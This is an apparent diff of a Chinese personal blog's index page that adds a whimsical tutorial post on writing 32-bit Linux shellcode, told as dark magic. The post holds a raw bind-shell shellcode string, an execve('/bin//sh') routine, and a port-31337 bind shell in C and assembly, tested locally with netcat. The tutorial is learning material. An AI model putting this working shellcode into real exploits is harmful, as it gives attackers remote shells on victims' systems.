@@ -224,6 +224,300 @@
             
               
                 
+                <a class="post-title-link" href="/exploit/2013/07/26/shellcode-black-magic/" itemprop="url">
+                  Shellcode: 暗黑魔咒
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2013-07-26T00:00:00+08:00" content="2013-07-26">
+              2013-07-26
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/exploit/2013/07/26/shellcode-black-magic/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2013/07/26/shellcode-black-magic/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <p><strong>警告：写的匆忙，里头有好多通甲字，作者实在懒得去辨认哪个字是对的，也许会满满修改吧，也许再也不会回头看了。另外，其实整个shellcode都来自那啥挖财宝的艺术一书，本文只是备忘、读后感、总结、笔记等诸如此类的东西，不算啥原创教程、葵花宝典、用户手册一类的高级货，所以很低端基础下档次，请大婶们轻喷:(</strong></p>
+<blockquote>
+<p>\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x66\x58\x99\x31<br>\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\x6a\x66\x58\x43<br>\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd<br>\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52<br>\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9<br>\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52<br>\x89\xe2\x53\x89\xe1\xcd\x80</p>
+<p>某个不知名的暗黑魔咒之shellcode</p>
+</blockquote>
+<h1 id="引子">引子</h1><p>多年之后，人们想起早年的尤利克斯黑法师仍然不寒而栗，他们来去无踪，却法力无边。他们出现在暗处低声吟诵不知所云的咒语，黑色的风暴便席卷整个大地，世界都在颤抖。他们不按规矩办事，是的，他们从不可能中创造出奇迹，几乎被奉为神明。</p>
+<p>四十年前当炼金术士K&amp;R在著名的贝尔实验室提炼出C元素时，黑魔法便诞生了。然而炼金术士们拒绝为他们符合K哲学的元素添加其它特性，他们想让使用它的法师们拥有更大的自由，嗯，法师们应该自己为自己负责。这种简洁和强大的元素立刻在法师们中流行开来，法师们用C元素重新创建了魔法世界，他们创造了各个大陆：尤利克斯、文都斯、利乐科斯等等，许多快乐的草泥马们无忧无虑地生活在这些繁荣的世界，他们又用C元素创建了因特奈特，将整个宇宙融为一体。是的，这是C的世界。</p>
+<p>然而炼金术士们的选择终会付出代价，一些巫师们抓住C元素的不检查数据边界的特性，开发了强大的黑魔法。20世界初期大魔导师汤普森曾经说，在C的世界晴朗的天空中，漂浮着两朵乌云，一朵是黑魔法，一朵是黑魔法师们。是的，这些黑魔法和C的世界一样古老。</p>
+<p>虽然那些黑魔法师们很可怕，正直而善良的法师们也没有坐以待毙，他们集结成社，开发了多种黑魔法防御术，建立了各种各样的法师团体替天行道保境安民，著名的有卡巴斯基、啊瓦斯特。但还有些团体在名目张胆研究和尝试新的黑魔法，他们负责测试和演习人们对黑魔法的防御程度，以促进对黑魔法防御术的研究。</p>
+<p>多亏具有分享精神的正直法师们，黑魔法逐渐在公众面前揭开了它的迷雾和面纱。我们才知道那不过是一种不按规矩来的法术和一些平常很难用到的咒语而已，并不像魔法世界流行的黑法师泡沫剧中所描述的那样：黑法师们赤手空拳就能凭借意念摧毁整个C的世界。</p>
+<p>本文作者很荣幸翻越了一些魔法禁书，看到了一些神奇的黑魔法，现在讲讲那让人眼花了乱该死的十六进制乱码咒语，希望大家喜欢。</p>
+<h2 id="你不能赤手空拳施法！">你不能赤手空拳施法！</h2><p>是的，起码你需要个魔杖或类似神秘的！电影电视上赤手空拳施法太奇葩了……大多数法器都是法师们由C元素炼成的，他们在C的世界里是真正的奇迹。这里我只列出一些在黑法师手中比较流行的法器：</p>
+<ul>
+<li>蛇。是的，有群人很喜欢蛇……他们施法时会带上一群蛇，据说第一条C之蛇是由满头长蛇的Guido直接用C炼成的，没人见过他，因为见过它的法师都变成石头了。但是,他把炼蛇之术公知与众，于是他的蛇也因为强大到邪恶被越来越多的法师们作为了法器。</li>
+<li>红宝石。 第一个C红宝石是十五年前炼成，最初的几年没什么人注意。后来其优良特性和美感吸引了越来越多的人，法师们发现红宝石使用起来灵活且让人快乐。特别是当法师团体买特斯普罗特将其作为其团体成员通用法器之后，红宝石迅速在黑法师团体中流行起来。</li>
+<li>有群老法师骑着骆驼，至今人们不知道那些法师怎么靠骆驼施法</li>
+<li>有群法师拿着破壳当法器。可能是贝壳或王八壳或者其它什么果壳之类的，壳不仅仅用来占卜，还可以杀人越货。如果你跟着往下尝试了，你就会用到一个壳= =</li>
+<li>当然，有些法师只需要C元素就够了，</li>
+<li>高端的法师甚至知道如何运用C炼成之前的物质，他们必须知道……</li>
+<li>还有很多C炼成的工具，在不同大陆却可能不一样。</li>
+<li>当然还有些很奇怪的人：有群法师骑着一匹快乐的草泥马，他们自称lisp alien，有群法师用咖啡杯做法器，听说还有群法师天天在那里撸啊撸的，这些中二的法师让本文作者无力吐槽：）</li>
+</ul>
+<p>本文只讨论如何在利乐科斯大陆运用一种古老而优雅的咒语：这种咒语被称作shellcode，通过shellcode，黑法师们可以接管整个C的世界。</p>
+<p>好吧，我不扯淡了，在你用python或perl或者其它啥可以被称作脚本语言的语言自动化一切之前，让我们仅仅用些基本的工具来编写shellcode。之后，你应该能综合运用各种法器来自动化你的黑魔法施法过程。</p>
+<p>下文我将展示如何在一个现代的gentoo amd64系统上尝试这些古老的黑魔法。看看那些十六进制咒语都是些什么jb东西。非常奇葩的是，作者虽然用着64位系统却要带着你们写32位的咒语，这显然是作者二逼了。不过，其实差别不大，但总还是有的，至于在哪里，好像寄存器啊，socketcall啊(持续碎碎念中……)</p>
+<h2 id="准备你的法器">准备你的法器</h2><p>你需要：</p>
+<ul>
+<li>nasm - 80x86汇编器，用来获取机器码</li>
+<li>gcc - 编译器</li>
+<li>man-pages - 系统调用和函数参考</li>
+<li>od - 得到shellcode</li>
+</ul>
+<p>最好有：</p>
+<ul>
+<li>prelink -设置堆栈可执行</li>
+<li>vim - 编写shellcode</li>
+<li>ld - 链接可执行文件</li>
+<li>gdb - 调试和观察、验证</li>
+<li>objdump - 用来显示目标文件中的信息</li>
+<li>strace - 追踪系统调用和信号</li>
+</ul>
+<p>可以在gentoo linux中：</p>
+<pre><code><span class="label">emerge</span> gcc gdb <span class="keyword">binutils </span>coreutils nasm prelink vim man-pages <span class="keyword">strace </span>
+</code></pre><p>当你碰到问题时，你最好的朋友是Linux Man Pages(利乐科斯大陆法师手册)</p>
+<p>首先，建立并进入工作目录。</p>
+<pre><code>~/Work/<span class="keyword">notes</span> ⮀ <span class="keyword">mkdir</span> shellcode
+~/Work/<span class="keyword">notes</span> ⮀ <span class="keyword">cd</span> shellcode
+</code></pre><p>建立一个用来编译并测试最后移除测试程序的shell文件：<code>test.sh</code></p>
+<pre><code>~/Work/<span class="keyword">notes</span>/shellcode ⮀ <span class="keyword">cat</span> &gt;&gt; <span class="keyword">test</span>.<span class="keyword">sh</span> &lt;&lt; EOF
+#! /bin/env bash
+nasm <span class="string">"$1"</span> # 用nasm 获取机器码
+
+<span class="keyword">cat</span> &gt;&gt; <span class="keyword">test</span>.c &lt;&lt; EOF_FLAG # 生成测试shellcode的程序文件
+<span class="comment">/* shellprogram.c */</span>
+<span class="keyword">char</span> code[] = 
+EOF_FLAG
+# 生成C数组形式的shellcode并写入测试程序文件 
+od -tx1 <span class="string">"`basename "</span><span class="label">$1</span><span class="string">" .asm`"</span> | cut -c8-80 | sed -<span class="keyword">e</span> 's/ /\\x/<span class="keyword">g</span>' | sed -<span class="keyword">e</span> 's/^/<span class="string">"/g' | sed -e 's/$/"</span>/<span class="keyword">g</span>' &gt;&gt; <span class="keyword">test</span>.c
+
+echo <span class="string">"\"</span>\<span class="string">";"</span> &gt;&gt; <span class="keyword">test</span>.c
+# 主程序 
+<span class="keyword">cat</span> &gt;&gt; <span class="keyword">test</span>.c &lt;&lt; EOF_FLAG
+int main(int argc, <span class="keyword">char</span> *argv[])
+{
+  int (*exeshell)();
+  exeshell = (int (*)()) code;
+  (int)(*exeshell)();
+}
+EOF_FLAG
+# 编译程序并清理
+gcc -fno-<span class="keyword">stack</span>-protector -z execstack -m32 -o tester <span class="keyword">test</span>.c
+<span class="keyword">rm</span> <span class="keyword">test</span>.c
+./tester
+<span class="keyword">rm</span> tester
+EOF
+</code></pre><p>这个程序会直接运行你的shellcode咒语。</p>
+<h2 id="编写Shellcode黑魔法咒语">编写Shellcode黑魔法咒语</h2><p>在Linux系统中，法师们可以通过系统调用(syscall)直接和内核交互，这使得在Linux下编写shellcode非常直观方便。你可以在网上找到Linux系统调用的快速参考表格，这些系统调用经久不变。你可以这样快速查找调用号。当然可以把以下内容写成个简易脚本来减少击键次数。</p>
+<pre><code>~/Work/notes/shellcode ⮀ grep execve /usr/include/asm/unistd_32<span class="class">.h</span> 
+<span class="hexcolor">#def</span>ine __NR_execve <span class="number">11</span>
+</code></pre><p>使用汇编来进行系统调用很直观，首先，32位cpu有8个通用寄存器(分别称为eax, ebx, ecx， edx, esi, edi, ebp, esp)，如何使用他们通常约定俗成。你需要把查找到的调用号推入eax中, 借着把该调用的参数依次推入ebx， ecx， edx， esi， edi，紧接着是一个<code>int 0x80</code>中断表示参数和调用哪个函数都指定了，现在可以开始调用了。</p>
+<p>那么这些系统调用的参数如何查阅呢？俗话说男人最重要，谷哥是其次。这时候就man吧，比如查看<code>execve</code>用法</p>
+<pre><code>~/Work/notes/shellcode ⮀ man execve
+.... Lots of things.....
+SYNOPSIS
+       <span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span>
+
+       <span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[],
+                  <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;
+</code></pre><p>在综述中(Synopsis)可以看到函数原型，那些参数就是要推入ebx， ecx， edx的东西。</p>
+<p>但是怎么把<code>const char *filename</code>这些参数推入寄存器中呢？这时候就要利用栈了(stack)我们把参数推到栈上，然后把地址推入寄存器。</p>
+<p>首先我们看看如何把调用号推入eax中</p>
+<p>为了使shellcode中不包含<code>\x00</code>即C语言中的NULL(至于为什么，这些字符是字符串定届符，而shellcode很多是通过字符串注入，如果shellcode中包含这种字符，显然会被截断)，我们不能直接这样</p>
+<pre><code><span class="keyword">mov</span> <span class="literal">eax</span>，<span class="number">0xb</span>
+</code></pre><p>这里我用的是metasploit项目tools中的<code>nasm_shell.rb</code>，可以很方便的用来查看汇编对应的机器码。</p>
+<pre><code>nasm &gt; <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0xb</span>
+<span class="number">00000000</span>  B80B000000        <span class="keyword">mov</span> <span class="literal">eax</span>,<span class="number">0xb</span>
+</code></pre><p>显然有好多0,因为我们mov时mov的是整个32位0xb，我们可以先将eax通过xor运算变为0，再将0xb推入低十六位。</p>
+<pre><code>nasm &gt; <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+<span class="number">00000000</span>  31C0              <span class="keyword">xor</span> <span class="literal">eax</span>,<span class="literal">eax</span>
+nasm &gt; <span class="keyword">mov</span> <span class="literal">al</span>, <span class="number">0xb</span>
+<span class="number">00000000</span>  B00B              <span class="keyword">mov</span> <span class="literal">al</span>,<span class="number">0xb</span>
+</code></pre><p>还有能让shellcode更短的方法，这个方法利用了栈。向栈推入一子节的0xb，然后弹出到eax中。你总是希望shellcode更短，shellcode越短，能运用的范围就越大。</p>
+<pre><code>nasm &gt; <span class="keyword">push</span> <span class="preprocessor">BYTE</span> <span class="number">11</span>
+<span class="number">00000000</span>  6A0B              <span class="keyword">push</span> <span class="preprocessor">byte</span> +<span class="number">0xb</span>
+nasm &gt; <span class="keyword">pop</span> <span class="literal">eax</span>
+<span class="number">00000000</span>  <span class="number">58</span>                <span class="keyword">pop</span> <span class="literal">eax</span>
+</code></pre><p>接着让我们看看如何把参数依次推入ebx， ecx和edx。为了清晰起见再次将综述列到下面。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv[],</span><br><span class="line">           <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure>
+<p>我们要想在shellcode中运行一个shell(这就是为何称为shellcode，获取控制的顶尖方法)可以<code>int execve(address of &quot;/bin//sh&quot;, address of [&quot;/bin//sh&quot;, NULL], NULL)</code></p>
+<p>shellcode中的地址都应该是相对取地址，因为不知道shellcode会被注入到程序的哪些部分，任何硬编码都是不可取的。</p>
+<p>我们利用栈完成一切相对取址。通过操作我们使栈顶看起来这样</p>
+<pre><code>+++++
+<span class="string">"/bin"</span>  &lt;-- 地址<span class="number">1</span>：四字节，<span class="number">32</span>位字符串,同时这里是栈顶，即esp(在ia32架构中是这样)
++++++
+<span class="string">"//sh"</span>  &lt;-- 地址<span class="number">2</span>：<span class="number">32</span>位字符串，<span class="comment">//在unix系统中与/并无区别</span>
++++++
+<span class="literal">NULL</span>    &lt;-- 地址：空字符<span class="literal">NULL</span>
+......
+</code></pre><p>这是这几步</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xor ecx, ecx&#10;push ecx&#10;push 0x68732f2f&#10;push 0x6e69622f&#10;mov ebx, esp</span><br></pre></td></tr></table></figure>
+<p>你好奇那些<code>0x687322f2f</code>什么的怎么来的？</p>
+<pre><code>~/Work/notes/shellcode ⮀ echo -ne <span class="string">"/bin//sh"</span> |od -tx4
+<span class="number">0000000</span> <span class="number">6e69622</span>f <span class="number">68732f</span>2f
+</code></pre><p>将esp即字符串<code>&quot;/bin//sh&quot;</code>的地址推入ebx，推入第一个参数。之后将一个NULL推入栈，栈变成这样</p>
+<pre><code>+++++
+<span class="literal">NULL</span>    &lt;-- 新栈顶，<span class="literal">NULL</span>
++++++
+<span class="string">"/bin"</span>  &lt;-- 地址<span class="number">1</span>：四字节，<span class="number">32</span>位字符串地址
++++++
+<span class="string">"//sh"</span>  &lt;-- 地址<span class="number">2</span>：<span class="number">32</span>位字符串，<span class="comment">//在unix系统中与/并无区别</span>
++++++
+<span class="literal">NULL</span>    &lt;-- 地址<span class="number">3</span>：空字符<span class="literal">NULL</span>，界定字符串
+......
+</code></pre><p>这几步如下，将NULL的地址推入edx</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push ecx&#10;xor edx, edx&#10;mov edx, esp</span><br></pre></td></tr></table></figure>
+<p>把字符串的地址推入栈，则栈如下所示：</p>
+<pre><code>+++++
+地址<span class="number">1</span>   &lt;-- 新栈顶esp，也是数组[address of <span class="string">"/bin//sh"</span>, <span class="literal">NULL</span>]的地址
++++++
+<span class="literal">NULL</span>    &lt;-- <span class="literal">NULL</span>
++++++
+<span class="string">"/bin"</span>  &lt;-- 地址<span class="number">1</span>：四字节，<span class="number">32</span>位字符串地址
++++++
+<span class="string">"//sh"</span>  &lt;-- 地址<span class="number">2</span>：<span class="number">32</span>位字符串，<span class="comment">//在unix系统中与/并无区别</span>
++++++
+<span class="literal">NULL</span>    &lt;-- 地址<span class="number">3</span>：空字符<span class="literal">NULL</span>，界定字符串
+......
+</code></pre><p>这几步如下所示：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push ebx&#10;mov ecx, esp</span><br></pre></td></tr></table></figure>
+<p>接着，各个参数都已经推入相应寄存器，直接开始调用<code>int 0x80</code></p>
+<h2 id="验证我们的咒语">验证我们的咒语</h2><p>把你的shellcode保存为任意以<code>.asm</code>为后缀的文件。比如<code>shellcode.asm</code></p>
+<p>用之前我们的测试脚本生成可执行文件：</p>
+<pre><code>~/Work/<span class="keyword">notes</span>/shellcode ⮀ <span class="keyword">sh</span> <span class="keyword">test</span>.<span class="keyword">sh</span> shellcode.asm
+<span class="keyword">sh</span>-4.2$ 
+</code></pre><p>非常棒！！</p>
+<h2 id="绑定端口的shellcode">绑定端口的shellcode</h2><p>如果你是通过某种法术把shellcode咒语施加到某个远程的程序上，一个在远程机器本地提供的shell没有丝毫用处。你需要绑定端口，然后使用TCP/IP瑞士军刀netcat来远程打开一个shell。</p>
+<p>为了将一个shell绑定到某个端口(比如31337端口，注意1024以下FIXME端口号的绑定需要root权限)上，需要做以下几步，我们先写出等效的C程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sockfd, new_sockfd;</span><br><span class="line">  <span class="keyword">struct</span> sockaddr_in host_addr, client_addr;</span><br><span class="line">  <span class="keyword">socklen_t</span> sin_size;</span><br><span class="line">  <span class="keyword">int</span> yes=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  sockfd = socket(PF_INET, SOCK_STREAM, <span class="number">0</span>); <span class="comment">// 建立一个流套接字</span></span><br><span class="line">  host_addr.sin_family = AF_INET; <span class="comment">// 定义协议族</span></span><br><span class="line">  host_addr.sin_port = htons(<span class="number">31337</span>); <span class="comment">// 定义端口号，注意本地到网络字节序转换</span></span><br><span class="line">  host_addr.sin_addr.s_addr = INADDR_ANY; <span class="comment">// 用本地IP填满</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;(host_addr.sin_zero), <span class="string">'\0'</span>, <span class="number">8</span>); <span class="comment">// 剩余空位用0填充</span></span><br><span class="line">  <span class="comment">// 将流套接字绑定到本地31337端口</span></span><br><span class="line">  bind(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;host_addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr));</span><br><span class="line"></span><br><span class="line">  listen(sockfd, <span class="number">4</span>); <span class="comment">// 监听</span></span><br><span class="line">  sin_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">  new_sockfd = accept(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;client_addr, &amp;sin_size);</span><br><span class="line">  dup2(new_sockfd, <span class="number">0</span>);</span><br><span class="line">  dup2(new_sockfd, <span class="number">1</span>);</span><br><span class="line">  dup2(new_sockfd, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">char</span> *newargv[] = &#123; <span class="string">"/bin/sh"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="keyword">char</span> *newenviron[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  execve(<span class="string">"/bin/sh"</span>, newargv, newenviron);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在linux中，可以直接和内核进行交互调用一个叫<code>socketcall</code>的syscall来使用这些函数</p>
+<pre><code>~/Work/notes/shellcode ⮀ grep socketcall /usr/include/asm/unistd_32<span class="class">.h</span> 
+<span class="hexcolor">#def</span>ine __NR_socketcall <span class="number">102</span>
+</code></pre><p>函数的用法<code>man socketcall</code>。第一个参数在<code>/usr/include/linux/net.h</code>中寻找。</p>
+<p>那么，在我们的shellcode中实现和C中一样，只是直接调用了系统调用socketcall。</p>
+<p>首先建立一个套接字，用法请自行<code>man socket</code>。</p>
+<pre><code><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;
+</code></pre><p>协议族(domain)是2(<code>PF_INET</code>，或者<code>AF_INET</code>,一样的)，类型(type)为1(<code>SOCK_STREAM</code>)，协议(protocol)为0(这个协议族只有一个协议，0就可以了)。奇怪这些数字哪里来的？<code>cat /usr/include/bits/socket.h</code>中自行grep。</p>
+<p>当我们用如下汇编语言来进行syscall之后，套接字句柄返回到eax中，我们用一个高效精简的指令把它放到esi中暂存。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; s = socket(2, 1, 0) or socketcall(1, &#38;(2,1,0))&#10;  push BYTE 0x66 &#9;; syscall 102&#10;  pop eax &#10;  cdq &#9;&#9;; &#23558;eax&#25193;&#23637;&#20026;&#20445;&#23384;&#22312;eax:edx&#20013;&#30340;64&#20301;&#25968;&#65292;&#23558;edx&#28165;&#20026;0&#10;  xor ebx, ebx &#9;; &#23558;ebx&#28165;0&#10;  inc ebx &#9;&#9;; 1 = socket()&#10;  push edx&#9;&#9;; &#23558;NULL&#25512;&#20837;&#22534;&#26632; &#21442;&#25968;&#21015;&#34920; ( protocol = 0&#10;  push BYTE 0x1&#9;; &#23558;8&#20301;1&#25512;&#20837;&#26632;   (&#36870;&#24207;)      SOCK_STREAM = 1&#10;  push BYTE 0x2&#9;; &#23558;8&#20301;2&#25512;&#20837;&#26632;               AF_INET = 2)&#10;  mov ecx, esp &#9;; &#23558;&#26632;&#39030;&#22320;&#22336;&#25512;&#20837;ecx&#10;  int 0x80</span><br></pre></td></tr></table></figure>
+<p>接下来,将该套接字绑定(bind)到端口31337上,监听(listen)此端口,接收(accept)。方式和以上完全一样，不做详细解释。只在汇编程序中做一些必要的注释。遇到问题请man.</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; bind(s, [2, 31337, 0], 16)&#10;  push BYTE 0x66&#10;  pop eax&#10;  inc ebx&#10;  push edx&#10;  push WORD 0x697a; inverse order&#10;  push WORD bx&#10;  mov ecx, esp ; server struct pointer&#10;  push BYTE 16&#10;  push ecx&#10;  push esi&#10;  mov ecx, esp; argument array&#10;  int 0x80&#10;&#10;; listen(s, 0)  &#10;  mov BYTE al, 0x66&#10;  inc ebx&#10;  inc ebx&#10;  push ebx&#10;  push esi&#10;  mov ecx, esp&#10;  int 0x80&#10;&#10;; c = accept(s, 0, 0)&#10;  mov BYTE al, 0x66&#10;  inc ebx&#10;  push edx&#10;  push edx&#10;  push esi&#10;  mov ecx, esp; ecx=argument array&#10;  int 0x80</span><br></pre></td></tr></table></figure>
+<p>然后复制文件描述符到标准输入输出错误：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; dup2(connected socket, &#123;all three standard I/O file descriptors&#125;)&#10;  xchg eax, ebx &#9;; put socket fd in ebx&#10;  push BYTE 0x2&#10;  pop ecx&#10;dup_loop: &#9;&#9;; &#20351;&#29992;&#24490;&#29615;&#26469;&#23558;&#25991;&#20214;&#25551;&#36848;&#31526;&#22797;&#21046;&#10;  mov BYTE al, 0x3F&#9;; &#26631;&#20934;&#36755;&#20837; 0&#10;  int 0x80&#9;&#9;; &#26631;&#20934;&#36755;&#20986; 1&#10;  dec ecx&#9;&#9;; &#26631;&#20934;&#38169;&#35823; 2&#10;  jns dup_loop</span><br></pre></td></tr></table></figure>
+<p>最后一步是我们上一步在本地完成的shellcode，启动shell：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; execve(const char *filename, char *const argv[], char *const envp[])&#10;  mov BYTE al, 11&#10;  push edx&#10;  push 0x68732f2f&#10;  push 0x6e69622f&#10;  mov ebx, esp&#10;  push edx&#10;  mov edx, esp&#10;  push ebx&#10;  mov ecx, esp&#10;  int 0x80</span><br></pre></td></tr></table></figure>
+<h2 id="验证新的咒语">验证新的咒语</h2><p>启动我们的实验程序：</p>
+<pre><code>~/Work/<span class="keyword">notes</span>/shellcode ⮀ <span class="keyword">sh</span> <span class="keyword">test</span>.<span class="keyword">sh</span> bind_shell.asm
+</code></pre><p>不要中断它，在另一个终端中用nc连接本地31337端口</p>
+<pre><code> ~/Site ⮀ ⭠ master ● ⮀ nc localhost <span class="number">31337</span>
+whoami
+reverland
+id
+uid=<span class="number">1000</span>(reverland) gid=<span class="number">1000</span>(reverland) groups=<span class="number">1000</span>(reverland),<span class="number">10</span>(wheel),<span class="number">27</span>(video),<span class="number">35</span>(games),<span class="number">70</span>(postgres),<span class="number">103</span>(vboxusers),<span class="number">997</span>(wireshark)
+</code></pre><p>虽然没有提示符，但你仍然可以和它交互。</p>
+<h2 id="What’_more">What’ more</h2><p>这些咒语其实很复杂，这篇文章只是匆匆一瞥，希望读者能喜欢。要想了解更多请参阅文末的那些魔法禁书：）</p>
+<p>如果有任何指教、建议、意见、痛斥、嘲笑、怀疑、讥讽、不解、感谢都欢迎<em>留言</em>或者通过<em><a href="http://reverland.org">电子邮件</a></em>告知我，我必将毫不留情的……嗯，洗耳恭听。</p>
+<p>Happy hacking！</p>
+<h2 id="魔法禁书目录">魔法禁书目录</h2><ul>
+<li>善良人手册：《The Shellcoder’s Handbook》</li>
+<li>黑魔法：挖财宝的艺术：《Hacking：The Art of Exploitation》</li>
+<li>揭秘：我没看过这本书：《Shellcoder’s programming uncovered》</li>
+</ul>
+<p>法师们注意，前两个因特奈特上都有中文版的！</p>
+
+            
+          </span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/exploit/2013/07/22/build-up-your-own-pt-lab/" itemprop="url">
                   建立渗透测试实验环境
                 </a>
@@ -1794,140 +2088,6 @@ $ gem install <span class="keyword">bundler</span>
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/phase-unwrapping/2013/04/07/2-d-phase-unwrapping-path-following/" itemprop="url">
-                  二维相位去包裹：路径积分法
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2013-04-07T00:00:00+08:00" content="2013-04-07">
-              2013-04-07
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp; 分类于
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/phase-unwrapping/" itemprop="url" rel="index">
-                    <span itemprop="name">phase-unwrapping</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/phase-unwrapping/2013/04/07/2-d-phase-unwrapping-path-following/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="phase-unwrapping/2013/04/07/2-d-phase-unwrapping-path-following/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
